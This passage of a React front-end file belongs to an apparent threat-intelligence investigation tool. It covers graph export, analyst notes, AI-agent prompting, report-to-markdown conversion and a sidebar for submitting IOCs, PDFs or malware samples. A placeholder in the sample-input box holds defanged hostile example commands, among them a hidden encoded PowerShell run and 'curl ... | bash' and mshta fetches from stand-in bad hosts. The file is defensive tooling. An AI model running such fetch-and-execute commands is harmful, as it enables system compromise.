        relation: e.data('relation'), evidence: e.data('evidence'),
      }))
    navigator.clipboard.writeText(JSON.stringify({ nodes, edges }, null, 2))
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  // Build Maltego-paste text: one `<entity_type>#<value>` per line.
  // See https://docs.maltego.com/ (Pasting Data) for the format.
  const copyToMaltego = () => {
    const targets = getTargetNodes()
    if (!targets || targets.length === 0) return
    const lines = []
    targets.forEach(n => {
      const d = n.data()
      const mapper = MALTEGO_TYPES[d.type]
      const mtype = mapper ? mapper(d.value) : 'maltego.Phrase'
      if (!mtype) return // e.g. report
      lines.push(`${mtype}#${d.value}`)
    })
    if (lines.length === 0) return
    navigator.clipboard.writeText(lines.join('\n'))
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  // ── Event log line classifier ─────────────────────────────────────────────
  const eventClass = (e) => {
    if (e.startsWith('__tool__')) return 'event-line tool'
    if (e.startsWith('__error__')) return 'event-line error'
    if (e === '__ratelimit__') return 'event-line ratelimit'
    return 'event-line'
  }
  const eventLabel = (e) => {
    if (e.startsWith('__tool__')) return e.slice(8)
    if (e.startsWith('__error__')) return e.slice(9)
    if (e === '__ratelimit__') return '⏳ rate limit — waiting'
    return e
  }

  // ── pivot ─────────────────────────────────────────────────────────────────
  // ── Pin / Unpin a node (toggles the 'pinned' tag). The backend broadcasts
  // a node_updated event so the cytoscape style reacts live. ──────────────
  const togglePin = async (node) => {
    if (!activeInv || !node) return
    const isPinned = (node.tags || []).includes('pinned')
    try {
      await fetch(`/api/investigations/${activeInv}/nodes/${node.id}/tag`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ tag: 'pinned', on: !isPinned }),
      })
    } catch (_) { /* ignore — WS will replay if reconnect */ }
  }

  // ── Save the analyst's free-text note for the currently selected node ──
  const saveNote = async () => {
    if (!activeInv || !selected) return
    setNoteBusy(true)
    try {
      await fetch(`/api/investigations/${activeInv}/nodes/${selected.id}/note`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ note: noteDraft || '' }),
      })
    } catch (_) { /* ignore */ }
    setNoteBusy(false)
  }

  const toggleFilterRelation = useCallback((rel) => {
    setFilterRelations(prev => {
      const next = new Set(prev)
      if (next.has(rel)) next.delete(rel); else next.add(rel)
      return next
    })
  }, [])

  const submitCustomPrompt = async () => {
    if (!activeInv || !customPrompt.trim()) return
    const text = customPrompt.trim()
    setPromptBusy(true)
    // Collect selected nodes (pickedIds) so the agent knows what the analyst is pointing at
    const selectedNodes = []
    const cy = cyRef.current
    if (cy && pickedIds.size > 0) {
      cy.nodes().forEach(n => {
        if (pickedIds.has(n.id())) {
          const d = n.data()
          selectedNodes.push({ type: d.type, value: d.value })
        }
      })
    }
    // Show the user's message optimistically in the chat right away
    setPendingPrompt({
      text,
      selectedNodes: selectedNodes.length > 0 ? selectedNodes : null,
      timestamp: new Date().toISOString(),
      prevLen: (report?.prompt_history || []).length,
    })
    setCustomPrompt('')
    setRightTab('chat')
    await fetch(`/api/investigations/${activeInv}/prompt`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        prompt: text,
        model,
        effort,
        selected_nodes: selectedNodes.length > 0 ? selectedNodes : null,
      })
    })
    const sel = selectedNodes.length > 0 ? ` [${selectedNodes.length} selected]` : ''
    setEvents(e => [`▶ custom prompt${sel}: ${text.slice(0, 60)}…`, ...e])
    // The bulk selection has been "consumed" by this prompt. Clear it so
    // the user can start a fresh selection without the previous batch
    // sticking around (and so it's visually obvious which nodes are now
    // in flight). This addresses Quentin's confusion when the selection
    // remained highlighted after the prompt fired.
    setPickedIds(new Set())
    // NOTE: promptBusy stays true — cleared when prompt_history grows or agent_exit fires
    refreshInvs()
  }

  const PIVOTABLE = ['domain', 'ip', 'hash', 'url', 'jarm', 'asn']
  const pivot = (n) => {
    if (!PIVOTABLE.includes(n.type)) return
    setInputMode('ioc')
    setSeedText(n.value)
  }

  // Pivot in-place: spawn another agent pass on the SAME investigation graph
  // (nodes/edges are merged via idempotent upserts).
  const pivotHere = async (n) => {
    if (!activeInv) return
    if (!PIVOTABLE.includes(n.type)) return
    await fetch(`/api/investigations/${activeInv}/enrich`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed_type: n.type, seed_value: n.value, model, effort })
    })
    setEvents(e => [`▶ enrich pivot: ${n.type} ${n.value}`, ...e])
    refreshInvs()
  }

  // Build a markdown view of the current report for "Copy MD". Uses exact
  // IOC values so analysts can paste into a ticket / chat without losing the
  // auto-linking on the UI (IOCs will be rediscoverable via search there).
  const reportToMarkdown = (r) => {
    if (!r) return ''
    const lines = []
    lines.push(`# Investigation summary`)
    lines.push('')
    if (r.threat_assessment) lines.push(`**Threat assessment:** \`${r.threat_assessment}\``)
    if (r.summary) { lines.push(''); lines.push(r.summary) }
    if (r.per_seed_summaries && Object.keys(r.per_seed_summaries).length) {
      lines.push(''); lines.push('## Per-seed summaries')
      Object.entries(r.per_seed_summaries).forEach(([sv, s]) => {
        lines.push(''); lines.push(`### \`${iocString(sv)}\` (${s?.type || '?'})`)
        if (s?.threat_assessment) lines.push(`**Threat assessment:** \`${s.threat_assessment}\``)
        if (s?.summary) { lines.push(''); lines.push(s.summary) }
        if (Array.isArray(s?.key_findings) && s.key_findings.length) {
          lines.push(''); lines.push('**Key findings:**')
          s.key_findings.forEach(f => {
            const text = typeof f === 'string' ? f : iocString(f.text)
            const srcs = (typeof f === 'object' && Array.isArray(f.sources)) ? f.sources : []
            const srcStr = srcs.length ? `  *(${srcs.map(iocString).join(', ')})*` : ''
            lines.push(`- ${text}${srcStr}`)
          })
        }
        if (Array.isArray(s?.sources_used) && s.sources_used.length) {
          lines.push(`**Sources used:** ${s.sources_used.map(x => `\`${iocString(x)}\``).join(', ')}`)
        }
      })
    }
    if (Array.isArray(r.cross_seed_findings) && r.cross_seed_findings.length) {
      lines.push(''); lines.push('## Cross-seed links')
      r.cross_seed_findings.forEach(c => {
        const text = typeof c === 'string' ? c : iocString(c.text)
        const seeds = (typeof c === 'object' && Array.isArray(c.seeds)) ? c.seeds : []
        const srcs = (typeof c === 'object' && Array.isArray(c.sources)) ? c.sources : []
        const seedStr = seeds.length ? `  _[seeds: ${seeds.map(iocString).join(', ')}]_` : ''
        const srcStr = srcs.length ? `  *(${srcs.map(iocString).join(', ')})*` : ''
        lines.push(`- ${text}${seedStr}${srcStr}`)
      })
    }
    if (r.key_findings?.length) {
      lines.push(''); lines.push('## Key findings')
      r.key_findings.forEach(f => {
        const text = typeof f === 'string' ? f : iocString(f.text)
        const srcs = (typeof f === 'object' && Array.isArray(f.sources)) ? f.sources : []
        const srcStr = srcs.length ? `  *(${srcs.map(iocString).join(', ')})*` : ''
        lines.push(`- ${text}${srcStr}`)
      })
    }
    if (r.discriminating_markers?.length) {
      lines.push(''); lines.push('## Discriminating markers')
      r.discriminating_markers.forEach(m => lines.push(`- \`${iocString(m)}\``))
    }
    if (r.pivot_suggestions?.length) {
      lines.push(''); lines.push('## Pivot suggestions')
      r.pivot_suggestions.forEach(p => lines.push(`- ${iocString(p)}`))
    }
    if (r.ioc_list?.length) {
      lines.push(''); lines.push('## IOC list')
      r.ioc_list.forEach(i => lines.push(`- \`${iocString(i)}\``))
    }
    if (r.sources_used?.length) {
      lines.push(''); lines.push(`**Sources used:** ${r.sources_used.map(s => `\`${iocString(s)}\``).join(', ')}`)
    }
    return lines.join('\n')
  }

  const copyReportMarkdown = () => {
    if (!report) return
    navigator.clipboard.writeText(reportToMarkdown(report))
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  const copyText = (txt) => {
    if (!txt) return
    navigator.clipboard.writeText(String(txt))
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  // ── Graph IOC search ────────────────────────────────────────────────────
  const doGraphSearch = useCallback((q) => {
    setGraphSearch(q)
    const cy = cyRef.current
    if (!cy) return
    const lq = q.trim().toLowerCase()
    if (!lq) {
      cy.nodes().removeClass('search-match search-dim')
      setSearchMatches(0)
      return
    }
    let count = 0
    cy.nodes().forEach(n => {
      const d = n.data()
      const val = (d.value || '').toLowerCase()
      const label = (d.label || '').toLowerCase()
      const match = val.includes(lq) || label.includes(lq)
      n.toggleClass('search-match', match)
      n.toggleClass('search-dim', !match)
      if (match) count++
    })
    setSearchMatches(count)
  }, [])

  const selectAllSearchMatches = useCallback(() => {
    const cy = cyRef.current
    if (!cy) return
    const ids = new Set()
    cy.nodes('.search-match').forEach(n => ids.add(n.id()))
    if (ids.size > 0) setPickedIds(ids)
  }, [])

  const focusNextSearchMatch = useCallback(() => {
    const cy = cyRef.current
    if (!cy) return
    const matches = cy.nodes('.search-match')
    if (matches.length === 0) return
    // Find first match not currently selected, or wrap around
    const current = cy.$(':selected')
    let target = matches[0]
    if (current.length) {
      const idx = matches.indexOf(current[0])
      if (idx >= 0 && idx + 1 < matches.length) target = matches[idx + 1]
      else target = matches[0]
    }
    cy.nodes().unselect()
    target.select()
    cy.animate({ fit: { eles: target.closedNeighborhood(), padding: 80 }, duration: 300 })
    setSelected(target.data())
    setRightTab('node')
  }, [])

  // ── Render ────────────────────────────────────────────────────────────────
  const existingTypeList = [...existingTypes].filter(t => t !== 'report')

  return (
    <>
    <div
      className={`app${isMobile ? ' mobile' : ''}${mobileLeftOpen ? ' drawer-left-open' : ''}${mobileRightOpen ? ' drawer-right-open' : ''}`}
      style={isMobile ? undefined : { gridTemplateColumns: `${leftWidth}px 5px 1fr 5px ${rightWidth}px` }}
    >
      {serverDown && (
        <div className="server-down-banner" role="status" aria-live="polite">
          <span className="server-down-spinner" />
          <span className="server-down-text">
            Service is restarting — reconnecting automatically…
          </span>
        </div>
      )}
      {quotaState.exhausted && (
        <div className="quota-banner" role="status" aria-live="polite">
          <span className="quota-banner-icon" aria-hidden="true">⏳</span>
          <span className="quota-banner-text">
            Claude subscription quota reached — new investigations are paused
            {quotaState.exhausted_until ? (
              <>. Resumes in <strong>{formatCountdown(quotaState.exhausted_until) || 'a moment'}</strong>.</>
            ) : '.'}
          </span>
        </div>
      )}
      {/* ── MOBILE TOP BAR (visible only on small screens via CSS) ── */}
      <div className="mobile-topbar" role="toolbar" aria-label="Mobile navigation">
        <button
          className="mobile-icon-btn"
          aria-label="Toggle sidebar"
          aria-expanded={mobileLeftOpen}
          onClick={() => { setMobileLeftOpen(v => !v); setMobileRightOpen(false) }}
        >
          <span className="mobile-burger" aria-hidden="true">☰</span>
        </button>
        <div className="mobile-topbar-title">
          <span className="logo-mark mobile-topbar-logo" aria-hidden="true" />
          <span>BOUNCE<span className="primary">CTI</span></span>
        </div>
        <button
          className="mobile-icon-btn"
          aria-label="Toggle details panel"
          aria-expanded={mobileRightOpen}
          onClick={() => { setMobileRightOpen(v => !v); setMobileLeftOpen(false) }}
        >
          <span className="mobile-burger" aria-hidden="true">⌘</span>
        </button>
      </div>
      {/* ── MOBILE BACKDROP — taps close any open drawer ── */}
      {(mobileLeftOpen || mobileRightOpen) && (
        <div
          className="mobile-backdrop"
          onClick={() => { setMobileLeftOpen(false); setMobileRightOpen(false) }}
          aria-hidden="true"
        />
      )}
      {/* ── LEFT SIDEBAR ── */}
      <div className={`sidebar${mobileLeftOpen ? ' mobile-open' : ''}`}>
        <div className="logo-row"><span className="logo-mark logo-mark-sidebar" aria-hidden="true" /><div className="logo">BOUNCE<span>CTI</span></div><button className="theme-toggle-btn" title={theme === 'light' ? 'Switch to dark theme' : 'Switch to light theme'} aria-label="Toggle theme" onClick={() => setTheme(t => t === 'light' ? 'dark' : 'light')}>{theme === 'light' ? '☾' : '☀'}</button>{isAdmin && <button className="admin-btn" title="Admin panel" onClick={() => setAdminOpen(true)}>⚙</button>}<button className="logout-btn" title="Log out" onClick={onLogout}>⎋</button></div>

        <div className="section-label">New investigation</div>
        {/* Segmented control:
            - IOC: paste one or many indicators (auto-detected, auto-batched).
            - Sample: upload an executable / dropper / archive OR paste a
              command line / script — the agent hashes the binary, extracts
              embedded IOCs, and reads the raw text as context.
            - PDF: upload an existing CTI report and let the agent read it. */}
        <div className="seg-control seg-control-3" role="tablist" aria-label="Investigation mode">
          <button
            type="button"
            role="tab"
            aria-selected={inputMode === 'ioc'}
            className={`seg-option${inputMode === 'ioc' ? ' active' : ''}`}
            onClick={() => setInputMode('ioc')}
            title="Paste a single IOC or a list — type is auto-detected"
          >
            <span className="seg-icon" aria-hidden="true">◆</span>
            IOC
          </button>
          <button
            type="button"
            role="tab"
            aria-selected={inputMode === 'sample'}
            className={`seg-option${inputMode === 'sample' ? ' active' : ''}`}
            onClick={() => setInputMode('sample')}
            title="Upload a malware sample / dropper / archive, or paste a malicious command line"
          >
            <span className="seg-icon" aria-hidden="true">⚙</span>
            Sample
          </button>
          <button
            type="button"
            role="tab"
            aria-selected={inputMode === 'pdf'}
            className={`seg-option${inputMode === 'pdf' ? ' active' : ''}`}
            onClick={() => setInputMode('pdf')}
            title="Upload an existing CTI report — extracts IOCs and feeds the report text to the agent"
          >
            <span className="seg-icon" aria-hidden="true">📄</span>
            PDF
          </button>
        </div>
        {inputMode === 'ioc' && (() => {
          const parsed = parseSeedInput(seedText)
          const multi = parsed.length > 1
          return (
            <>
              <textarea
                className="batch-textarea"
                value={seedText}
                onChange={e => setSeedText(e.target.value)}
                onKeyDown={e => {
                  // Single-line input → Enter submits. Multi-line → keep newline
                  // for additional IOCs; submit on Cmd/Ctrl+Enter.
                  if (e.key === 'Enter' && !e.shiftKey && (!seedText.includes('\n') || e.metaKey || e.ctrlKey)) {
                    e.preventDefault()
                    start()
                  }
                }}
                placeholder={`Paste one IOC, or a list (defanged ok — one per line or comma-separated):\nexample.com\n1.2.3.4\nhxxps://evil[.]com/path`}
                rows={3}
              />
              {multi && (
                <div className="batch-switch" title="Separate: one investigation per IOC. Combined: all IOCs on one graph to find cross-links.">
                  <span className={`batch-switch-label${!batchCombined ? ' active' : ''}`}>Separate</span>
                  <button
                    type="button"
                    className={`switch-track${batchCombined ? ' on' : ''}`}
                    onClick={() => setBatchCombined(v => !v)}
                    aria-label="Toggle combined mode"
                  >
                    <span className="switch-thumb" />
                  </button>
                  <span className={`batch-switch-label${batchCombined ? ' active' : ''}`}>Combined</span>
                </div>
              )}
            </>
          )
        })()}
        {inputMode === 'pdf' && (
          <div className="pdf-dropzone">
            <input
              ref={pdfFileInputRef}
              id="pdf-file-input"
              type="file"
              accept="application/pdf,.pdf"
              onChange={e => { setPdfFile(e.target.files?.[0] || null); setPdfError('') }}
              hidden
            />
            <label htmlFor="pdf-file-input" className="pdf-drop-target">
              {pdfFile ? (
                <>
                  <span className="pdf-drop-icon" aria-hidden="true">📄</span>
                  <span className="pdf-drop-name" title={pdfFile.name}>
                    {pdfFile.name.length > 38 ? pdfFile.name.slice(0, 36) + '…' : pdfFile.name}
                  </span>
                  <span className="pdf-drop-meta">
                    {(pdfFile.size / 1024).toFixed(1)} KB · cliquer pour changer
                  </span>
                </>
              ) : (
                <>
                  <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
                  <span className="pdf-drop-name">Choisir un PDF de rapport CTI</span>
                  <span className="pdf-drop-meta">Le texte est lu par l'agent (max 25 MB)</span>
                </>
              )}
            </label>
            {pdfError && <div className="pdf-error">{pdfError}</div>}
          </div>
        )}
        {inputMode === 'sample' && (
          <div className="sample-pane">
            <input
              ref={sampleFileInputRef}
              id="sample-file-input"
              type="file"
              onChange={e => {
                setSampleFile(e.target.files?.[0] || null)
                setSampleError('')
              }}
              hidden
            />
            <label htmlFor="sample-file-input" className="pdf-drop-target">
              {sampleFile ? (
                <>
                  <span className="pdf-drop-icon" aria-hidden="true">⚙</span>
                  <span className="pdf-drop-name" title={sampleFile.name}>
                    {sampleFile.name.length > 38 ? sampleFile.name.slice(0, 36) + '…' : sampleFile.name}
                  </span>
                  <span className="pdf-drop-meta">
                    {(sampleFile.size / 1024).toFixed(1)} KB · click to replace
                  </span>
                </>
              ) : (
                <>
                  <span className="pdf-drop-icon" aria-hidden="true">⬆</span>
                  <span className="pdf-drop-name">Drop an executable / dropper / archive</span>
                  <span className="pdf-drop-meta">Hashed locally — file is not stored (max 25 MB)</span>
                </>
              )}
            </label>
            <div className="sample-or">or paste a command line / script</div>
            <textarea
              className="batch-textarea"
              value={sampleText}
              onChange={e => setSampleText(e.target.value)}
              placeholder={'powershell -nop -w hidden -enc <base64>\ncurl http://evil[.]tld/x.sh | bash\nmshta hxxps://bad[.]site/p.hta'}
              rows={4}
              disabled={!!sampleFile}
              title={sampleFile ? 'Clear the file selection to paste a command' : ''}
            />
            {sampleError && <div className="pdf-error">{sampleError}</div>}
          </div>
        )}
        {verticals.length > 1 && (
          <>
            <div className="section-label">Vertical</div>
            <select value={vertical} onChange={e => setVertical(e.target.value)}
                    title="Investigation lens. CTI = threat-infrastructure attribution. OSINT = identity / entity footprint correlation.">
              {verticals.map(v => <option key={v.name} value={v.name}>{v.label}</option>)}
            </select>
          </>
        )}
        <div className="section-label">Model</div>
        <select value={model} onChange={e => setModel(e.target.value)}>
          {(!allowedModels || allowedModels.includes('sonnet')) && <option value="sonnet">Sonnet 4.6 (recommended)</option>}
          {(!allowedModels || allowedModels.includes('opus')) && <option value="opus">Opus 4.6 (smarter, slower)</option>}
          {(!allowedModels || allowedModels.includes('opus-4.7')) && <option value="opus-4.7">Opus 4.7</option>}
          {(!allowedModels || allowedModels.includes('opus-4.8')) && <option value="opus-4.8">Opus 4.8 (latest, smartest)</option>}
          {(!allowedModels || allowedModels.includes('haiku')) && <option value="haiku">Haiku 4.5 (faster, lighter)</option>}
        </select>
        <div className="section-label">Thinking effort</div>
        <select value={effort} onChange={e => setEffort(e.target.value)}
                title="Extended-thinking budget for the agent. Higher = deeper reasoning, slower & more quota. 'Default' lets the model decide.">
          <option value="">Default (model decides)</option>
          <option value="low">Low — fast, shallow</option>
          <option value="medium">Medium</option>
          <option value="high">High</option>
          <option value="xhigh">Extra high</option>
          <option value="max">Max — deepest, slowest</option>
        </select>
        <button
          onClick={
            inputMode === 'pdf'    ? startFromPdf
            : inputMode === 'sample' ? startFromSample
            : start
          }
          disabled={
            (inputMode === 'pdf' && (pdfBusy || !pdfFile)) ||
            (inputMode === 'sample' && (sampleBusy || (!sampleFile && !sampleText.trim()))) ||
            (inputMode === 'ioc' && parseSeedInput(seedText).length === 0)
          }
        >
          {inputMode === 'pdf'
            ? (pdfBusy ? 'Analyse du PDF…' : 'Importer le rapport →')
            : inputMode === 'sample'
            ? (sampleBusy ? 'Hashing & extracting…' : (sampleFile ? 'Submit sample →' : 'Investigate command →'))
            : (() => {
                const n = parseSeedInput(seedText).length
                if (n <= 1) return 'Investigate →'
                return `Launch ${n} IOC${n > 1 ? 's' : ''} →`
              })()}
        </button>

        <div className="section-label">History</div>
        <div className="inv-list">
          {invs.map(i => {
            const seedCount = (i.seeds || []).length
            const extraSeeds = seedCount > 1 ? seedCount - 1 : 0
            return (
              <div
                key={i.id}
                className={`inv-item${activeInv === i.id ? ' active' : ''}`}
                onClick={() => openInv(i.id)}
                title={seedCount > 1
                  ? `Multi-seed: ${(i.seeds || []).map(s => s.value).join(', ')}`
                  : undefined}
              >
                <div className="inv-item-main">
                  <span
                    className={`inv-seed${i.title ? ' has-title' : ''}`}
                    title={i.title ? `${i.title} — seed: ${i.seed_value}` : i.seed_value}
                  >
                    {i.title || i.seed_value}
                  </span>
                  {extraSeeds > 0 && (
                    <span className="inv-seed-count" title={`${seedCount} seeds in this investigation`}>
                      +{extraSeeds}
                    </span>
                  )}
                  <span className="inv-type">{i.seed_type}</span>
                  {i.vertical === 'osint' && (
                    <span className="inv-vertical-badge" title="OSINT vertical">OSINT</span>
                  )}
                </div>
                <div className="inv-item-meta">
                  <span className="inv-status-dot" style={{ background: STATUS_COLOR[i.status] || '#8b949e' }} />
                  <span className="inv-status-text" style={{ color: STATUS_COLOR[i.status] || '#8b949e' }}>
                    {i.status === 'quota_exceeded'
                      ? (i.quota_reset_at
                          ? `quota — ${formatCountdown(i.quota_reset_at) || 'ready'}`
                          : 'quota reached')
                      : i.status}
                  </span>
                  {i.model && <span className="inv-model-badge">{i.model}</span>}
                  <span className="inv-actions">
                    {i.status === 'running' && (
                      <button className="icon-btn warning" title="Stop" onClick={e => stopInv(i.id, e)}>■</button>
                    )}
                    {i.status === 'quota_exceeded' && (
                      <button
                        className="icon-btn primary"
                        title={quotaState.exhausted
                          ? `Claude quota cooldown — resumes in ${formatCountdown(quotaState.exhausted_until) || 'a moment'}`
                          : 'Resume this investigation from where it stopped'}
                        disabled={quotaState.exhausted}
                        onClick={e => resumeInv(i.id, e)}
                      >▶</button>
                    )}
                    <button
                      className="icon-btn"
                      title={i.title ? `Rename (current: ${i.title})` : 'Rename'}
                      onClick={e => renameInv(i.id, i.title, i.seed_value, e)}
                    >✎</button>
                    <button className="icon-btn" title="Rerun" onClick={e => rerunInv(i.id, e)}>↺</button>
                    {/* Merge into another of my investigations. Backend dedups
                        nodes (type, value) and edges (src, dst, relation),
                        unioning metadata + tags + sources_seen. Disabled while
                        the source is still running (its graph is half-built). */}
                    <button
                      className={`icon-btn${mergePickerSrc === i.id ? ' active' : ''}`}
                      title={i.status === 'running'
                        ? 'Stop the investigation before merging'
                        : 'Merge into another investigation'}
                      disabled={i.status === 'running'}
                      onClick={e => {
                        e.stopPropagation()
                        setMergePickerSrc(prev => prev === i.id ? null : i.id)
                      }}
                    >⇆</button>
                    <button className="icon-btn danger" title="Delete" onClick={e => deleteInv(i.id, e)}>✕</button>
                  </span>
                </div>
                {/* Inline target picker. Listing only other invs owned by the
                    caller (the API is owner-checked too). */}
                {mergePickerSrc === i.id && (
                  <div
                    className="inv-merge-picker"
                    onClick={e => e.stopPropagation()}
                  >
                    <span className="inv-merge-label">Merge into:</span>
                    <select
                      className="inv-merge-select"
                      defaultValue=""
                      onChange={e => {
                        const dst = e.target.value
                        if (!dst) return
                        const dstInv = invs.find(x => x.id === dst)
                        const srcLabel = i.title || i.seed_value || i.id
                        const dstLabel = dstInv ? (dstInv.title || dstInv.seed_value || dstInv.id) : dst
                        const delSrc = confirm(
                          `Merge "${srcLabel}" into "${dstLabel}"?\n\n` +
                          `Click OK to also DELETE the source after merging.\n` +
                          `Click Cancel to keep the source intact (you can delete it later).`
                        )
                        // confirm() returning false here means "keep source",
                        // not "abort merge" — we always proceed with the merge
                        // once a target is picked. Aborting would require a
                        // second prompt and feels clunkier than offering an
                        // explicit "Cancel" entry on the dropdown.
                        mergeInv(i.id, dst, delSrc)
                      }}
                    >
                      <option value="" disabled>Pick destination…</option>
                      {invs
                        .filter(j => j.id !== i.id)
                        .map(j => (
                          <option key={j.id} value={j.id}>
                            {j.title || j.seed_value || j.id}
                            {((j.seeds || []).length > 1) ? ` (+${j.seeds.length - 1})` : ''}
                          </option>
                        ))}
                    </select>
                    <button
                      className="icon-btn"
                      title="Cancel"
                      onClick={() => setMergePickerSrc(null)}
                    >✕</button>
                  </div>
                )}
              </div>
            )
          })}
        </div>

        {/* Add-IOC panel: appears only when an investigation is open. Lets the
            analyst attach a new peer seed (independent IOC) to the same graph.
            The agent compares its infrastructure against existing nodes and
            cross-links when concrete overlap is found. */}
        {activeInv && (() => {
          const activeInvData = invs.find(i => i.id === activeInv)
          const activeSeeds = activeInvData?.seeds || []
          const isRunning = activeInvData?.status === 'running'
          return (
            <>
              <div className="section-label">Add IOC to this investigation</div>
              {activeSeeds.length > 0 && (
                <div className="seed-chips" title="All seeds on this graph">
                  {activeSeeds.map((s, i) => (
                    <span key={i} className="seed-chip">
                      <span className="seed-chip-type">{s.type}</span>
                      <span className="seed-chip-value">{s.value}</span>
                    </span>
                  ))}
                </div>
              )}
              <div className="add-seed-form">
                <input
                  value={addSeedValue}
                  onChange={e => setAddSeedValue(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && !isRunning && submitAddSeed()}
                  placeholder="Paste any IOC (auto-detected)"
                />
                <button
                  className="btn-sm"
                  disabled={isRunning || !addSeedValue.trim()}
                  onClick={submitAddSeed}
                  title={isRunning
                    ? 'Agent is running — wait for it to finish before adding another seed'
                    : 'Add this IOC as a peer seed on the current graph'}
                >
                  + Add
                </button>
              </div>
              {/* Same affordance via PDF: drop a fresh write-up onto the
                  graph and the extracted IOCs become add-seeds. */}
              <input
                ref={pdfAddSeedInputRef}
                id="pdf-add-seed-input"
                type="file"
                accept="application/pdf,.pdf"
                onChange={e => { const f = e.target.files?.[0]; if (f) addPdfToActiveInv(f) }}
                hidden
              />
              <label
                htmlFor="pdf-add-seed-input"
                className={`btn-sm pdf-add-seed-btn${isRunning || pdfBusy ? ' disabled' : ''}`}
                title={isRunning
                  ? 'Agent is running — wait for it to finish'
                  : 'Upload a CTI report PDF — extracted IOCs are added as seeds'}
              >
                {pdfBusy ? '… Analyse PDF' : '📄 Importer un PDF'}
              </label>
              {pdfError && <div className="pdf-error">{pdfError}</div>}
              {/* Share entry-point: visible as soon as an investigation is open
                  (don't make analysts hunt for it inside the report tab). */}
              <button
                className="btn-sm share-btn sidebar-share-btn"
                onClick={() => setShareOpen(true)}
                title="Generate a share link for this investigation"
              >
                ↗ Partager cette investigation
              </button>
            </>
          )
        })()}

        <div className="section-label">Agent log</div>
        <div className="event-log">
          {events.length === 0 && <div className="event-line" style={{ color: 'var(--on-dim)' }}>No events yet</div>}
          {events.map((e, i) => (
            <div key={i} className={eventClass(e)}>{eventLabel(e)}</div>
          ))}
        </div>
      </div>

      {/* ── LEFT RESIZE HANDLE ── */}
      <div className="resize-handle" onMouseDown={startDrag('left')} title="Drag to resize" />

      {/* ── GRAPH ── */}
      <div className={`graph${mobileFiltersOpen ? ' mobile-filters-open' : ''}`}>
        <div id="cy" ref={containerRef} style={{ position: 'absolute', inset: 0 }} />

        {/* Graph toolbar (search integrated) */}
        <div className="graph-toolbar">
          <input
            className="graph-search-input"
            type="text"
            value={graphSearch}
            onChange={e => doGraphSearch(e.target.value)}
            onKeyDown={e => {
              if (e.key === 'Enter' && e.shiftKey) selectAllSearchMatches()
              else if (e.key === 'Enter') focusNextSearchMatch()
              else if (e.key === 'Escape') { doGraphSearch(''); e.target.blur() }
            }}
            placeholder="Search IOCs…"
          />
          {graphSearch && (
            <span className="graph-search-info">
              {searchMatches} match{searchMatches !== 1 ? 'es' : ''}
              {searchMatches > 0 && (
                <>
                  <button className="graph-search-action" onClick={focusNextSearchMatch} title="Focus next (Enter)">↵</button>
                  <button className="graph-search-action" onClick={selectAllSearchMatches} title="Select all matches (Shift+Enter)">☐⁺</button>
                </>
              )}
              <button className="graph-search-action" onClick={() => doGraphSearch('')} title="Clear search">✕</button>
            </span>
          )}
          <span className="toolbar-separator" />
          <button className="toolbar-btn" onClick={() => cyRef.current?.fit(undefined, 80)} title="Fit graph">
            ⊡ Fit
          </button>
          <button className="toolbar-btn" onClick={hardRelayout} title="Re-run layout (randomize)">
            ⟳ Relayout
          </button>
          <button
            className={`toolbar-btn${showEdgeLabels ? ' active' : ''}`}
            onClick={() => setShowEdgeLabels(v => !v)}
            title="Toggle edge labels"
          >
            {showEdgeLabels ? '⌗ Labels on' : '⌗ Labels off'}
          </button>
          <button
            className={`toolbar-btn${showPins ? ' active' : ''}`}
            onClick={() => setShowPins(v => !v)}
            title="Toggle 📌 pin markers on the graph"
          >
            {showPins ? '📌 Pins on' : '📌 Pins off'}
          </button>
          <button
            className={`toolbar-btn${showNotes ? ' active' : ''}`}
            onClick={() => setShowNotes(v => !v)}
            title="Toggle analyst notes (e.g. 'VPN', 'C2') under each node"
          >
            {showNotes ? '✎ Notes on' : '✎ Notes off'}
          </button>
          <button
            className="toolbar-btn"
            onClick={copyGraphJson}
            disabled={nodeCount === 0}
            title={pickedIds.size > 0
              ? `Copy ${pickedIds.size} selected node(s) as JSON`
              : `Copy all ${nodeCount} node(s) as JSON — ctrl+click nodes to narrow`}
          >
            {copied ? '✓ copied' : `↓ JSON (${pickedIds.size > 0 ? pickedIds.size : nodeCount})`}
          </button>
          <button
            className="toolbar-btn hide-on-mobile"
            onClick={copyToMaltego}
            disabled={nodeCount === 0}
            title={pickedIds.size > 0
              ? `Copy ${pickedIds.size} selected node(s) in Maltego paste format`
              : `Copy all ${nodeCount} node(s) in Maltego paste format — ctrl+click nodes to narrow`}
          >
            {copied ? '✓ copied' : `⟶ Maltego (${pickedIds.size > 0 ? pickedIds.size : nodeCount})`}
          </button>
          {pickedIds.size > 0 && (
            <button
              className="toolbar-btn"
              onClick={() => setPickedIds(new Set())}
              title="Clear selection (back to all-nodes default)"
            >
              ✕ clear
            </button>
          )}
        </div>

        {/* Mobile-only toggle for the filter chips. They overlay the lower
            graph, so on phones we keep them collapsed by default and let the
            analyst reveal them on demand. Hidden on desktop via CSS. */}
        {(existingTypeList.length > 0 || existingRelations.size >= 2) && (
          <button
            className="filter-toggle-btn mobile-only"
            onClick={() => setMobileFiltersOpen(v => !v)}
            aria-expanded={mobileFiltersOpen}
            aria-label={mobileFiltersOpen ? 'Hide type filters' : 'Show type filters'}
          >
            {mobileFiltersOpen ? '✕ filters' : '⚑ filters'}
          </button>
        )}

        {/* Filter chips wrapper. `display: contents` on desktop so each bar
            keeps its own absolute position exactly as before; on mobile it
            becomes a collapsible bottom-sheet (see .filter-bars in styles). */}
        <div className="filter-bars">
        {/* Node type filter bar */}
        {existingTypeList.length > 0 && (
          <div className="filter-bar">
            {existingTypeList.map(type => {
              const active = !filterTypes.has(type)
              const color = NODE_COLORS[type] || '#8b949e'
              return (
                <button
                  key={type}
                  className="filter-chip"
                  onClick={() => toggleFilterType(type)}
                  style={active
